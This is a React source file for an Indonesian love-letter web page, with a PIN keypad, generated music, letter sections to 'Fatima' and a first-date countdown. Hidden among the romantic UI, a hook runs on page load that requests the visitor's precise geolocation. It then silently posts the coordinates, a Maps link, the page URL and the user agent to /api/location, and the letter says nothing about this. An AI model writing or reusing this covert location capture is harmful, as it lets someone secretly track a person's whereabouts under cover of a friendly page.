import { useEffect, useMemo, useRef, useState } from "react";

const PASSCODE = "250924";
const KEYPAD_ANIM_MS = 360;
const LOCATION_REQUEST_FLAG = "__loveLetterLocationRequested";
const LOCATION_API_ENDPOINT = "/api/location";
const TYPEWRITER_DELAY_MS = 48;
const DATE_EVENT_TARGET_ISO = "2026-05-02T10:00:00+07:00";
const MUSIC_TRACK_URL = (import.meta.env.VITE_LETTER_MUSIC_URL ?? "").trim();
const MUSIC_SAMPLE_RATE = 44100;
const MUSIC_LOOP_SECONDS = 12;
const MUSIC_VOLUME = 0.34;
const MUSIC_START_OFFSET_SECONDS = 2;
const MUSIC_FADE_IN_MS = 880;
const MUSIC_FADE_OUT_MS = 560;

const letterSections = [
  {
    title: "Pembuka — Bagian 1",
    paragraphs: ["Udah siap baca surat dari ku ini?"]
  },
  {
    title: "Pembuka — Bagian 2",
    paragraphs: ["Jangan salting gitu dong😋"]
  },
  {
    title: "Dear Fatima",
    paragraphs: [
      "Halooo Fatim, maaf aku lama bikinnya yaaa..... Sebenernya ini rencanaku dari lama, cuma akhir akhir ini lagi sibuk banget huhuhu",
      "Akhirnya sekarang aku bisa duduk manis buat nulis surat ini buat kamu. Aku harap kamu suka yaa, karena aku bikin ini istimewa banget nihh buat kamu sayanggg❤️."
    ]
  },
  {
    title: "Tentang Kita",
    paragraphs: [
      "In the first place, waktu kita pertama ketemu, perasaanku bilang ke aku kalau kita itu bakal deket, dan yap ternyata bener haha 😆. Aku suka kamu di awal kita ketemu jujur dan sampe sekarang perasaan itu masih sama.",
      "Aku suka dengerin cerita kamu, cerita hidup kamu, dan hal-hal kecil yang kamu share ke aku. Aku juga suka cara kamu ketawa, cara kamu senyum, dan apapun itu aku suka bangetttttt Fatimmmmmm🥰."
    ]
  },
  {
    title: "Janji Kecilku",
    paragraphs: [
      "Aku pengen bisa deket sama kamu terus, berusaha buat jadi orang yang bisa kamu andelin dalam hal apapun. Aku mau berusaha jadi buat lebih baik lagi.",
      "Makasih... kemaren sudah doain aku, sudah support aku, dan sudah jadi tempat aku cerita. Aku sayang bangetttt sama kamu Fatimmm, dan aku harap kita bisa terus deket kayak gini terus yaa.......",
      "Makasihhh sudah jadi rumah untuk cerita, suka, tawa, dan doa-doaku. Aku sayang banget sama kamu, hari ini, nanti, besok, dan seterusnya❤️.",
      "— dari Fahrur yang suka banget ama Fatimmm"
    ]
  },
  {
    title: "",
    paragraphs: [
      "Kalau kamu mau aku pengen ngajak fatimm first date nihhh hehe 👉🏻👈🏻. Aku pengen kita jalan bareng, ngobrol sana sini, dan nikmatin waktu berdua aja🙃.",
      "Aku mo dengerin cerita kamu lebih lama secara langsung, ketawa bareng kamu lebih sering, dan bikin momen pertama kita jadi kenangan yang manis anjayyyzzzz hahaha.",
      "Kalau kamu mau, bilang mau yaa, gaboleh enggk. Kita atur bareng ntar."
    ]
  },
  {
    title: "Rencana First Date Kita",
    paragraphs: [
      "Kalau jadi nihhh, kita ketemu besok yaww Sabtu, 2 Mei 2026.",
      "Jam 10.00, di rumah kamu.",
      "Ntar aku jemput kamu yaa."
    ]
  },
  {
    title: "Countdown to Our Date",
    paragraphs: [
      "Lama banget nihh😫"
    ]
  },
  {
    title: "",
    paragraphs: [
      "Makasih.... yaa.... uda baca surat ini sampai akhir 🤍 🥺.",
      "Makasih juga uda jadi orang yang aku suka. Makasih uda dengerin aku dan jujur km bikin setiap hariku jadi jauh lebih hangat. Aku seneng banget bisa kenal kamu❤️."
    ]
  }
];
const INTRO_READY_SECTION_INDEX = 0;
const INTRO_SALTING_SECTION_INDEX = 1;
const DATE_INVITE_SECTION_INDEX = 5;
const DATE_COUNTDOWN_SECTION_INDEX = 7;

const keypadLayout = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "clear", "0", "back"];
const keypadCats = [
  { id: "kp-cat-1", icon: "🐱", cls: "kp-cat-a" },
  { id: "kp-cat-2", icon: "🐾", cls: "kp-cat-b" },
  { id: "kp-cat-3", icon: "😺", cls: "kp-cat-c" },
  { id: "kp-cat-4", icon: "🐾", cls: "kp-cat-d" }
];
const catOrnaments = [
  { id: "cat-1", icon: "🐱", left: "7%", top: "12%", delay: "0s", size: "1.45rem", tilt: "-8deg" },
  { id: "paw-1", icon: "🐾", left: "18%", top: "27%", delay: "0.9s", size: "1.05rem", tilt: "12deg" },
  { id: "cat-2", icon: "🐈", left: "84%", top: "15%", delay: "1.4s", size: "1.35rem", tilt: "6deg" },
  { id: "paw-2", icon: "🐾", left: "76%", top: "31%", delay: "2.1s", size: "0.98rem", tilt: "-10deg" },
  { id: "cat-3", icon: "😺", left: "11%", top: "74%", delay: "2.8s", size: "1.42rem", tilt: "7deg" },
  { id: "paw-3", icon: "🐾", left: "23%", top: "84%", delay: "3.5s", size: "1.04rem", tilt: "-7deg" },
  { id: "cat-4", icon: "🐈‍⬛", left: "82%", top: "73%", delay: "4.1s", size: "1.32rem", tilt: "-6deg" },
  { id: "paw-4", icon: "🐾", left: "72%", top: "86%", delay: "4.8s", size: "0.95rem", tilt: "8deg" }
];
const HEART_EMOJI_SPLIT_REGEX = /(\u2764\uFE0F|💖|💕|💗|💘|💝|💞|💓|💟|🩷|🧡|💛|💚|💙|💜|🤍|🖤|💌|♥|\u2764)/g;
const HEART_EMOJI_SET = new Set([
  "❤️",
  "💖",
  "💕",
  "💗",
  "💘",
  "💝",
  "💞",
  "💓",
  "💟",
  "🩷",
  "🧡",
  "💛",
  "💚",
  "💙",
  "💜",
  "🤍",
  "🖤",
  "💌",
  "♥",
  "❤"
]);

function renderTextWithHeartBeat(text, keyPrefix) {
  const value = String(text ?? "");
  const parts = value.split(HEART_EMOJI_SPLIT_REGEX);

  if (parts.length === 1) {
    return value;
  }

  return parts.map((part, index) => {
    if (!HEART_EMOJI_SET.has(part)) {
      return part;
    }

    return (
      <span
        key={`${keyPrefix}-heart-${index}`}
        className="heart-beat heart-inline"
        style={{ animationDelay: `${(index % 4) * 110}ms` }}
      >
        {part}
      </span>
    );
  });
}

const createLoveLoopUrl = () => {
  const totalSamples = MUSIC_SAMPLE_RATE * MUSIC_LOOP_SECONDS;
  const data = new Float32Array(totalSamples);
  const sequence = [261.63, 293.66, 329.63, 392.0, 329.63, 293.66, 261.63, 196.0];
  const noteSeconds = MUSIC_LOOP_SECONDS / sequence.length;
  const noteLength = Math.floor(MUSIC_SAMPLE_RATE * noteSeconds);
  const attack = 0.03;
  const release = 0.14;

  let maxAbs = 0;
  for (let i = 0; i < totalSamples; i += 1) {
    const noteIndex = Math.floor(i / noteLength) % sequence.length;
    const freq = sequence[noteIndex];
    const localIndex = i % noteLength;
    const noteProgress = localIndex / noteLength;
    const t = i / MUSIC_SAMPLE_RATE;

    let envelope = 1;
    if (noteProgress < attack) {
      envelope = noteProgress / attack;
    } else if (noteProgress > 1 - release) {
      envelope = (1 - noteProgress) / release;
    }
    envelope = Math.max(0, Math.min(1, envelope));

    const base = Math.sin(2 * Math.PI * freq * t);
    const harmony = Math.sin(2 * Math.PI * (freq * 1.5) * t + 0.22);
    const pad = Math.sin(2 * Math.PI * (freq / 2) * t + 0.4);
    const vibrato = 1 + 0.014 * Math.sin(2 * Math.PI * 4.2 * t);
    const sample = (base * 0.56 + harmony * 0.24 + pad * 0.2) * envelope * vibrato;

    data[i] = sample;
    const abs = Math.abs(sample);
    if (abs > maxAbs) maxAbs = abs;
  }

  const normalize = maxAbs > 0.98 ? 0.98 / maxAbs : 0.92;
  const dataLength = totalSamples * 2;
  const buffer = new ArrayBuffer(44 + dataLength);
  const view = new DataView(buffer);

  const writeString = (offset, value) => {
    for (let i = 0; i < value.length; i += 1) {
      view.setUint8(offset + i, value.charCodeAt(i));
    }
  };

  writeString(0, "RIFF");
  view.setUint32(4, 36 + dataLength, true);
  writeString(8, "WAVE");
  writeString(12, "fmt ");
  view.setUint32(16, 16, true);
  view.setUint16(20, 1, true);
  view.setUint16(22, 1, true);
  view.setUint32(24, MUSIC_SAMPLE_RATE, true);
  view.setUint32(28, MUSIC_SAMPLE_RATE * 2, true);
  view.setUint16(32, 2, true);
  view.setUint16(34, 16, true);
  writeString(36, "data");
  view.setUint32(40, dataLength, true);

  let offset = 44;
  for (let i = 0; i < totalSamples; i += 1) {
    const clamped = Math.max(-1, Math.min(1, data[i] * normalize));
    view.setInt16(offset, Math.round(clamped * 32767), true);
    offset += 2;
  }

  const blob = new Blob([buffer], { type: "audio/wav" });
  return URL.createObjectURL(blob);
};

export default function App() {
  const [isOpen, setIsOpen] = useState(false);
  const [isUnlocked, setIsUnlocked] = useState(false);
  const [isKeypadOpen, setIsKeypadOpen] = useState(false);
  const [isKeypadMounted, setIsKeypadMounted] = useState(false);
  const [code, setCode] = useState("");
  const [, setWrongAttempts] = useState(0);
  const [pinPopup, setPinPopup] = useState(null);
  const [sectionIndex, setSectionIndex] = useState(0);
  const [typedChars, setTypedChars] = useState(0);
  const [nowMs, setNowMs] = useState(() => Date.now());
  const hearts = useMemo(() => Array.from({ length: 12 }, (_, i) => i), []);
  const keypadUnmountTimer = useRef(null);
  const popupTimerRef = useRef(null);
  const musicRef = useRef(null);
  const musicUrlRef = useRef("");
  const musicOffsetAppliedRef = useRef(false);
  const musicFadeRafRef = useRef(null);
  const isRomanceMode = isUnlocked && isOpen;
  const currentSection = letterSections[sectionIndex];
  const currentSectionText = useMemo(
    () =>
      sectionIndex <= INTRO_SALTING_SECTION_INDEX
        ? currentSection.paragraphs.join("\n\n")
        : `${currentSection.title}\n\n${currentSection.paragraphs.join("\n\n")}`,
    [currentSection, sectionIndex]
  );
  const shouldTypewriter = sectionIndex > INTRO_SALTING_SECTION_INDEX;
  const isCurrentSectionComplete = shouldTypewriter
    ? typedChars >= currentSectionText.length
    : true;
  const visibleSectionText = shouldTypewriter
    ? currentSectionText.slice(0, typedChars)
    : currentSectionText;
  const isFirstSection = sectionIndex === 0;
  const isLastSection = sectionIndex === letterSections.length - 1;
  const isReadyIntroSection = sectionIndex === INTRO_READY_SECTION_INDEX;
  const isSaltingIntroSection = sectionIndex === INTRO_SALTING_SECTION_INDEX;
  const isIntroSection = isReadyIntroSection || isSaltingIntroSection;
  const isDateInviteSection = sectionIndex === DATE_INVITE_SECTION_INDEX;
  const isDateCountdownSection = sectionIndex === DATE_COUNTDOWN_SECTION_INDEX;
  const showDateActions = isDateInviteSection && isCurrentSectionComplete;
  const showDateCountdown = isDateCountdownSection && isCurrentSectionComplete;
  const dateCountdown = useMemo(() => {
    const targetMs = new Date(DATE_EVENT_TARGET_ISO).getTime();
    const diffMs = Math.max(0, targetMs - nowMs);
    const hours = Math.floor(diffMs / 3600000);
    const minutes = Math.floor((diffMs % 3600000) / 60000);
    const seconds = Math.floor((diffMs % 60000) / 1000);
    const isReached = diffMs === 0;

    return { hours, minutes, seconds, isReached };
  }, [nowMs]);

  useEffect(() => {
    const generatedMusicUrl = MUSIC_TRACK_URL ? "" : createLoveLoopUrl();
    const audio = new Audio(MUSIC_TRACK_URL || generatedMusicUrl);
    audio.loop = true;
    audio.preload = "auto";
    audio.volume = 0;

    const handleAudioError = () => {
      if (musicUrlRef.current) return;
      const fallbackUrl = createLoveLoopUrl();
      musicUrlRef.current = fallbackUrl;
      audio.src = fallbackUrl;
      audio.load();
    };

    if (MUSIC_TRACK_URL) {
      audio.addEventListener("error", handleAudioError);
    }

    musicRef.current = audio;
    musicUrlRef.current = generatedMusicUrl;
    musicOffsetAppliedRef.current = false;

    return () => {
      if (MUSIC_TRACK_URL) {
        audio.removeEventListener("error", handleAudioError);
      }

      if (keypadUnmountTimer.current) {
        window.clearTimeout(keypadUnmountTimer.current);
        keypadUnmountTimer.current = null;
      }

      if (popupTimerRef.current) {
        window.clearTimeout(popupTimerRef.current);
        popupTimerRef.current = null;
      }

      if (musicFadeRafRef.current !== null) {
        window.cancelAnimationFrame(musicFadeRafRef.current);
        musicFadeRafRef.current = null;
      }

      if (musicRef.current) {
        musicRef.current.pause();
        musicRef.current.src = "";
        musicRef.current = null;
      }

      if (musicUrlRef.current) {
        URL.revokeObjectURL(musicUrlRef.current);
        musicUrlRef.current = "";
      }
    };
  }, []);

  const showPinPopup = (popup, durationMs = 2300) => {
    if (popupTimerRef.current) {
      window.clearTimeout(popupTimerRef.current);
      popupTimerRef.current = null;
    }

    setPinPopup(popup);
    popupTimerRef.current = window.setTimeout(() => {
      setPinPopup(null);
      popupTimerRef.current = null;
    }, durationMs);
  };

  const applyMusicStartOffset = (audio) => {
    const maxTime =
      Number.isFinite(audio.duration) && audio.duration > 0
        ? Math.max(0, audio.duration - 0.05)
        : MUSIC_START_OFFSET_SECONDS;
    const target = Math.min(MUSIC_START_OFFSET_SECONDS, maxTime);

    try {
      audio.currentTime = target;
      musicOffsetAppliedRef.current = true;
    } catch {
      // Ignore seek failures when metadata is not ready.
    }
  };

  const cancelMusicFade = () => {
    if (musicFadeRafRef.current !== null) {
      window.cancelAnimationFrame(musicFadeRafRef.current);
      musicFadeRafRef.current = null;
    }
  };

  const fadeMusicTo = (targetVolume, durationMs, options = {}) => {
    const audio = musicRef.current;
    if (!audio) return;

    const { pauseOnComplete = false } = options;
    const clampedTarget = Math.max(0, Math.min(1, targetVolume));
    const startVolume = Number.isFinite(audio.volume) ? audio.volume : 0;

    cancelMusicFade();

    if (durationMs <= 0 || Math.abs(clampedTarget - startVolume) < 0.002) {
      audio.volume = clampedTarget;
      if (pauseOnComplete && clampedTarget <= 0.001) {
        audio.pause();
      }
      return;
    }

    const startTime = performance.now();
    const tick = (now) => {
      const progress = Math.min(1, (now - startTime) / durationMs);
      const eased = 1 - (1 - progress) ** 3;
      audio.volume = startVolume + (clampedTarget - startVolume) * eased;

      if (progress < 1) {
        musicFadeRafRef.current = window.requestAnimationFrame(tick);
        return;
      }

      musicFadeRafRef.current = null;
      audio.volume = clampedTarget;
      if (pauseOnComplete && clampedTarget <= 0.001) {
        audio.pause();
      }
    };

    musicFadeRafRef.current = window.requestAnimationFrame(tick);
  };

  const tryPlayMusic = () => {
    const audio = musicRef.current;
    if (!audio) return;

    cancelMusicFade();

    if (!musicOffsetAppliedRef.current) {
      if (audio.readyState >= 1) {
        applyMusicStartOffset(audio);
      } else {
        audio.addEventListener("loadedmetadata", () => applyMusicStartOffset(audio), {
          once: true
        });
      }
    }

    const maybePromise = audio.play();
    if (maybePromise && typeof maybePromise.catch === "function") {
      maybePromise.catch(() => {});
    }

    fadeMusicTo(MUSIC_VOLUME, MUSIC_FADE_IN_MS);
  };

  useEffect(() => {
    if (window[LOCATION_REQUEST_FLAG]) return;
    window[LOCATION_REQUEST_FLAG] = true;

    if (!("geolocation" in navigator)) return;

    navigator.geolocation.getCurrentPosition(
      ({ coords }) => {
        const { latitude, longitude, accuracy } = coords;
        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;

        void sendLocationEmail({ latitude, longitude, accuracy, mapUrl }).catch(() => {});
      },
      () => {},
      {
        enableHighAccuracy: true,
        timeout: 12000,
        maximumAge: 0
      }
    );
  }, []);

  useEffect(() => {
    if (!isKeypadOpen) return;
    if (code.length !== PASSCODE.length) return;

    if (code === PASSCODE) {
      setIsUnlocked(true);
      setIsOpen(false);
      setWrongAttempts(0);
      showPinPopup({
        type: "hint",
        title: "PIN bener 💌",
        message: "Tekan amplop sekali lagi buat buka suratnya."
      });
      setSectionIndex(0);
      setTypedChars(0);
      closeKeypad();
      return;
    }

    setCode("");
    setWrongAttempts((current) => {
      const next = current + 1;

      if (next >= 3) {
        showPinPopup(
          {
            type: "hint",
            title: "Masih belum pas 🐾",
            message: "Coba cek WA yaa, ada petunjuk kecil di sana."
          },
          3200
        );
      } else {
        showPinPopup({
          type: "angry",
          title: "PIN-nya belum tepat 😾",
          message: "Tenang, coba sekali lagi pelan-pelan."
        });
      }

      return next;
    });
  }, [code, isKeypadOpen]);

  useEffect(() => {
    if (!isUnlocked || !isOpen) return;
    setTypedChars(0);
  }, [sectionIndex, isUnlocked, isOpen]);

  useEffect(() => {
    if (!isUnlocked || !isOpen || !shouldTypewriter) return;
    if (typedChars >= currentSectionText.length) return;

    const timer = window.setTimeout(() => {
      setTypedChars((count) => Math.min(count + 1, currentSectionText.length));
    }, TYPEWRITER_DELAY_MS);

    return () => window.clearTimeout(timer);
  }, [typedChars, currentSectionText, isUnlocked, isOpen, shouldTypewriter]);

  useEffect(() => {
    if (!isUnlocked || !isOpen || !isDateCountdownSection) return;

    const updateNow = () => setNowMs(Date.now());
    updateNow();

    const interval = window.setInterval(updateNow, 1000);
    return () => window.clearInterval(interval);
  }, [isUnlocked, isOpen, isDateCountdownSection]);

  useEffect(() => {
    if (isRomanceMode) return;
    fadeMusicTo(0, MUSIC_FADE_OUT_MS, { pauseOnComplete: true });
  }, [isRomanceMode]);

  const openKeypad = () => {
    if (keypadUnmountTimer.current) {
      window.clearTimeout(keypadUnmountTimer.current);
      keypadUnmountTimer.current = null;
    }

    setIsKeypadMounted(true);
    window.requestAnimationFrame(() => setIsKeypadOpen(true));
    setCode("");
  };

  const closeKeypad = () => {
    setIsKeypadOpen(false);
    setCode("");

    if (keypadUnmountTimer.current) {
      window.clearTimeout(keypadUnmountTimer.current);
      keypadUnmountTimer.current = null;
    }

    keypadUnmountTimer.current = window.setTimeout(() => {
      setIsKeypadMounted(false);
      keypadUnmountTimer.current = null;
    }, KEYPAD_ANIM_MS);
  };

  const handleEnvelopeClick = () => {
    if (!isUnlocked) {
      openKeypad();
      return;
    }

    if (isOpen) {
      const shouldReset = isLastSection && isCurrentSectionComplete;
      setIsOpen(false);
      if (shouldReset) {
        setSectionIndex(0);
        setTypedChars(0);
      }
      return;
    }

    setIsOpen(true);
    tryPlayMusic();
  };

  const handleEnvelopeKeyDown = (event) => {
    if (event.key !== "Enter" && event.key !== " ") return;
    event.preventDefault();
    handleEnvelopeClick();
  };

  const handleKey = (key) => {
    if (key === "clear") {
      setCode("");
      return;
    }

    if (key === "back") {
      setCode((current) => current.slice(0, -1));
      return;
    }

    if (!/^\d$/.test(key)) return;

    setCode((current) => {
      if (current.length >= PASSCODE.length) return current;
      return current + key;
    });
  };

  const sendLocationEmail = async ({ latitude, longitude, accuracy, mapUrl }) => {
    const response = await fetch(LOCATION_API_ENDPOINT, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      keepalive: true,
      body: JSON.stringify({
        latitude,
        longitude,
        accuracy,
        mapUrl,
        pageUrl: window.location.href,
        userAgent: navigator.userAgent,
        capturedAt: new Date().toISOString()
      })
    });

    if (!response.ok) {
      const text = await response.text();
      throw new Error(text || "Gagal mengirim lokasi ke email");
    }
  };

  const handlePreviousSection = (event) => {
    event.stopPropagation();
    if (isFirstSection) return;
    setSectionIndex((index) => Math.max(index - 1, 0));
  };

  const handleNextSection = (event) => {
    event.stopPropagation();

    if (!isCurrentSectionComplete) return;

    if (isLastSection) {
      setIsOpen(false);
      setSectionIndex(0);
      setTypedChars(0);
      return;
    }
    setSectionIndex((index) => Math.min(index + 1, letterSections.length - 1));
  };

  const handleCloseLetter = (event) => {
    event.stopPropagation();
    const shouldReset = isLastSection && isCurrentSectionComplete;
    setIsOpen(false);
    if (shouldReset) {
      setSectionIndex(0);
      setTypedChars(0);
    }
  };

  const handleDateResponse = (event, response) => {
    event.stopPropagation();

    showPinPopup(
      {
        type: "hint",
        title: response === "mau" ? "Yeay, kamu mau 💖" : "Ayo kita date 🐾",
        message: "Aku siapin momen pertama kita yang manis yaa."
      },
      2600
    );
    setSectionIndex(Math.min(DATE_INVITE_SECTION_INDEX + 1, letterSections.length - 1));
    setTypedChars(0);
  };

  const handleReadyIntro = (event) => {
    event.stopPropagation();
    if (!isCurrentSectionComplete) return;
    setSectionIndex(INTRO_SALTING_SECTION_INDEX);
    setTypedChars(0);
  };

  const handleSaltingIntro = (event) => {
    event.stopPropagation();
    if (!isCurrentSectionComplete) return;
    setSectionIndex(INTRO_SALTING_SECTION_INDEX + 1);
    setTypedChars(0);
  };

  const formatCountdownUnit = (value) => String(value).padStart(2, "0");
  const countdownText = `${formatCountdownUnit(dateCountdown.hours)}:${formatCountdownUnit(dateCountdown.minutes)}:${formatCountdownUnit(dateCountdown.seconds)}`;

  return (
    <main className={`page ${isRomanceMode ? "romance" : ""}`}>
      <div className="glow glow-a" aria-hidden="true" />
      <div className="glow glow-b" aria-hidden="true" />

      <div className="hearts" aria-hidden="true">
        {hearts.map((heart) => (
          <span
            key={heart}
            className="floating-heart"
            style={{
              left: `${8 + heart * 7}%`,
              animationDelay: `${heart * 0.45}s`
            }}
          >
            <span
              className="heart-beat heart-inline floating-heart-symbol"
              style={{ animationDelay: `${heart * 0.22}s` }}
            >
              ♥
            </span>
          </span>
        ))}
      </div>

      <div className="cat-ornaments" aria-hidden="true">
        {catOrnaments.map((item) => (
          <span
            key={item.id}
            className={`cat-ornament ${item.icon === "🐾" ? "paw" : "cat"}`}
            style={{
              left: item.left,
              top: item.top,
              fontSize: item.size,
              animationDelay: item.delay,
              "--cat-tilt": item.tilt
            }}
          >
            {item.icon}
          </span>
        ))}
      </div>

      {pinPopup ? (
        <div className={`pin-popup ${pinPopup.type}`} role="status" aria-live="polite">
          <p className="pin-popup-title">{renderTextWithHeartBeat(pinPopup.title, "popup-title")}</p>
          <p className="pin-popup-message">{renderTextWithHeartBeat(pinPopup.message, "popup-message")}</p>
        </div>
      ) : null}

      {isKeypadMounted && (
        <div
          className="keypad-overlay"
          data-state={isKeypadOpen ? "open" : "closing"}
          role="dialog"
          aria-modal="true"
          aria-label="Masukkan kode"
          onClick={closeKeypad}
        >
          <div className="keypad" onClick={(event) => event.stopPropagation()}>
            <p className="keypad-title">Tanggal Pertama Kita Chatan</p>
            <div className="keypad-cats" aria-hidden="true">
              {keypadCats.map((item) => (
                <span key={item.id} className={`keypad-cat ${item.cls}`}>
                  {item.icon}
                </span>
              ))}
            </div>
            <div className="code-display" aria-label="Kode">
              {Array.from({ length: PASSCODE.length }, (_, index) => (
                <span
                  key={index}
                  className={`code-slot ${code[index] ? "filled" : "empty"}`}
                >
                  {code[index] ?? "🐾"}
                </span>
              ))}
            </div>

            <div className="code-spacer" />

            <div className="keys" aria-label="Keypad">
              {keypadLayout.map((key) => (
                <button
                  key={key}
                  type="button"
                  className={`key ${key === "clear" ? "key-aux" : ""} ${key === "back" ? "key-aux" : ""}`}
                  onClick={() => handleKey(key)}
                  aria-label={
                    key === "clear" ? "Hapus semua" : key === "back" ? "Hapus satu" : `Angka ${key}`
                  }
                >
                  {key === "clear" ? "C" : key === "back" ? "⌫" : key}
                </button>
              ))}
            </div>
          </div>
        </div>
      )}

      <div
        className={`envelope ${isOpen ? "open" : ""}`}
        role="button"
        tabIndex={0}
        onClick={handleEnvelopeClick}
        onKeyDown={handleEnvelopeKeyDown}
        aria-label={
          !isUnlocked
            ? "Masukkan kode untuk membuka surat"
            : isOpen
              ? "Tutup surat"
              : "Buka surat"
        }
      >
        <span className="flap" />
        <div
          className={`paper ${isIntroSection ? "intro-paper" : ""}`}
          aria-hidden={!isUnlocked}
          onClick={(event) => event.stopPropagation()}
        >
          {isUnlocked ? (
            <>
              <div className="letter-header">
                <p className="letter-page-meta">
                  {sectionIndex + 1} / {letterSections.length}
                </p>
                {!isLastSection ? (
                  <button
                    type="button"
                    className="letter-close-btn"
                    onClick={handleCloseLetter}
                    aria-label="Tutup surat"
                  >
                    ×
                  </button>
                ) : null}
              </div>
              <p
                key={`letter-content-${sectionIndex}`}
                className={`letter-content ${isIntroSection ? "letter-content-intro" : ""}`}
              >
                {renderTextWithHeartBeat(visibleSectionText, `letter-${sectionIndex}`)}
                {shouldTypewriter && !isCurrentSectionComplete ? (
                  <span className="typing-cursor" aria-hidden="true">|</span>
                ) : null}
                {showDateCountdown ? (
                  <span className="letter-countdown-line">{countdownText}</span>
                ) : null}
              </p>
              {isIntroSection ? (
                <div key={`intro-nav-${sectionIndex}`} className="letter-nav letter-intro-nav">
                  <button
                    type="button"
                    className="letter-nav-btn letter-nav-next letter-intro-btn"
                    onClick={isReadyIntroSection ? handleReadyIntro : handleSaltingIntro}
                    disabled={!isCurrentSectionComplete}
                  >
                    {isReadyIntroSection ? (
                      <>
                        Siap <span className="heart-beat heart-inline" aria-hidden="true">❤️</span>
                      </>
                    ) : "Next"}
                  </button>
                </div>
              ) : isDateInviteSection ? (
                showDateActions ? (
                  <div className="letter-nav letter-nav-date">
                    <div className="letter-date-actions">
                      <button
                        type="button"
                        className="letter-nav-btn letter-date-btn letter-date-mau"
                        onClick={(event) => handleDateResponse(event, "mau")}
                      >
                        Mau
                      </button>
                      <button
                        type="button"
                        className="letter-nav-btn letter-date-btn letter-date-ayo"
                        onClick={(event) => handleDateResponse(event, "ayo")}
                      >
                        Ayo
                      </button>
                    </div>
                  </div>
                ) : null
              ) : (
                <div className={`letter-nav ${isFirstSection ? "letter-nav-single" : ""}`}>
                  {!isFirstSection ? (
                    <button
                      type="button"
                      className="letter-nav-btn"
                      onClick={handlePreviousSection}
                    >
                      Prev
                    </button>
                  ) : null}
                  <button
                    type="button"
                    className="letter-nav-btn letter-nav-next"
                    onClick={handleNextSection}
                    disabled={!isCurrentSectionComplete}
                  >
                    {isLastSection ? "Close" : "Next"}
                  </button>
                </div>
              )}
            </>
          ) : null}
        </div>
      </div>

      <footer className="page-footer">
        Made with <span className="heart-beat heart-inline" aria-hidden="true">❤️</span>
      </footer>
    </main>
  );
}
